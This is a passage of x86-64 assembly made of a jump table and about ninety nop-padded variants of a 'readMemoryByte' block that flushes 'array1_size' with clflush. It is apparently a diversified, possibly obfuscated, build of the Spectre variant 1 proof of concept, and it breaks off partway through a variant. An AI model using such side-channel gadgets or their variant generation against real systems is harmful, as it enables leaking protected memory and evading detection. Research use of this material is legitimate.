	je	.LreadMemoryByte_win6_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win6_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win6_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win6_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win6_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win6_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win6_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win6_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win6_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win6_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win6_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win6_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win6_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win6_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win6_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win6_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win6_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win6_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win6_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win6_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win6_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win6_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win6_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win6_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win6_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win6_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win6_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win6_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win6_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win6_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win6_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win6_var149
	jmp	.LreadMemoryByte_win6_var0
## Variant 0
.LreadMemoryByte_win6_var0:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 1
.LreadMemoryByte_win6_var1:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 2
.LreadMemoryByte_win6_var2:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 3
.LreadMemoryByte_win6_var3:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 4
.LreadMemoryByte_win6_var4:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 5
.LreadMemoryByte_win6_var5:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 6
.LreadMemoryByte_win6_var6:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 7
.LreadMemoryByte_win6_var7:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 8
.LreadMemoryByte_win6_var8:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 9
.LreadMemoryByte_win6_var9:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 10
.LreadMemoryByte_win6_var10:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 11
.LreadMemoryByte_win6_var11:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 12
.LreadMemoryByte_win6_var12:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 13
.LreadMemoryByte_win6_var13:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 14
.LreadMemoryByte_win6_var14:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 15
.LreadMemoryByte_win6_var15:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 16
.LreadMemoryByte_win6_var16:
	popq	%rax
	nop
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 17
.LreadMemoryByte_win6_var17:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 18
.LreadMemoryByte_win6_var18:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 19
.LreadMemoryByte_win6_var19:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 20
.LreadMemoryByte_win6_var20:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 21
.LreadMemoryByte_win6_var21:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 22
.LreadMemoryByte_win6_var22:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 23
.LreadMemoryByte_win6_var23:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 24
.LreadMemoryByte_win6_var24:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 25
.LreadMemoryByte_win6_var25:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 26
.LreadMemoryByte_win6_var26:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 27
.LreadMemoryByte_win6_var27:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 28
.LreadMemoryByte_win6_var28:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 29
.LreadMemoryByte_win6_var29:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 30
.LreadMemoryByte_win6_var30:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 31
.LreadMemoryByte_win6_var31:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 32
.LreadMemoryByte_win6_var32:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 33
.LreadMemoryByte_win6_var33:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 34
.LreadMemoryByte_win6_var34:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 35
.LreadMemoryByte_win6_var35:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 36
.LreadMemoryByte_win6_var36:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 37
.LreadMemoryByte_win6_var37:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 38
.LreadMemoryByte_win6_var38:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 39
.LreadMemoryByte_win6_var39:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 40
.LreadMemoryByte_win6_var40:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 41
.LreadMemoryByte_win6_var41:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 42
.LreadMemoryByte_win6_var42:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 43
.LreadMemoryByte_win6_var43:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 44
.LreadMemoryByte_win6_var44:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 45
.LreadMemoryByte_win6_var45:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 46
.LreadMemoryByte_win6_var46:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 47
.LreadMemoryByte_win6_var47:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 48
.LreadMemoryByte_win6_var48:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 49
.LreadMemoryByte_win6_var49:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 50
.LreadMemoryByte_win6_var50:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 51
.LreadMemoryByte_win6_var51:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 52
.LreadMemoryByte_win6_var52:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 53
.LreadMemoryByte_win6_var53:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 54
.LreadMemoryByte_win6_var54:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 55
.LreadMemoryByte_win6_var55:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 56
.LreadMemoryByte_win6_var56:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 57
.LreadMemoryByte_win6_var57:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 58
.LreadMemoryByte_win6_var58:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 59
.LreadMemoryByte_win6_var59:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 60
.LreadMemoryByte_win6_var60:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 61
.LreadMemoryByte_win6_var61:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 62
.LreadMemoryByte_win6_var62:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 63
.LreadMemoryByte_win6_var63:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 64
.LreadMemoryByte_win6_var64:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 65
.LreadMemoryByte_win6_var65:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 66
.LreadMemoryByte_win6_var66:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 67
.LreadMemoryByte_win6_var67:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 68
.LreadMemoryByte_win6_var68:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 69
.LreadMemoryByte_win6_var69:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 70
.LreadMemoryByte_win6_var70:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 71
.LreadMemoryByte_win6_var71:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 72
.LreadMemoryByte_win6_var72:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 73
.LreadMemoryByte_win6_var73:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 74
.LreadMemoryByte_win6_var74:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 75
.LreadMemoryByte_win6_var75:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 76
.LreadMemoryByte_win6_var76:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 77
.LreadMemoryByte_win6_var77:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 78
.LreadMemoryByte_win6_var78:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 79
.LreadMemoryByte_win6_var79:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 80
.LreadMemoryByte_win6_var80:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 81
.LreadMemoryByte_win6_var81:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 82
.LreadMemoryByte_win6_var82:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 83
.LreadMemoryByte_win6_var83:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 84
.LreadMemoryByte_win6_var84:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 85
.LreadMemoryByte_win6_var85:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 86
.LreadMemoryByte_win6_var86:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 87
.LreadMemoryByte_win6_var87:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 88
.LreadMemoryByte_win6_var88:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 89
.LreadMemoryByte_win6_var89:
	popq	%rax
